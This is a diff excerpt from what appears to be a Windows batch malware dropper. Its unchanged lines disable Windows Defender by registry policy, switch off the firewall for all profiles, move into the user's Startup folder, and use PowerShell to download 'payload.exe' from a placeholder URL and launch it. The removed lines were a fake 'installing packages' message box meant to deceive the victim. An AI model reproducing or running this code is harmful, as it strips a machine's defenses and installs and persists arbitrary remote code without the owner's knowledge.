@@ -65,8 +65,5 @@ powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows def
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-echo msgbox "Hey! Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!" > %tmp%\tmp.vbs
-wscript %tmp%\tmp.vbs
-del %tmp%\tmp.vbs
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://direct-url/foryour-payload', '.\payload.exe') }
 start payload.exe
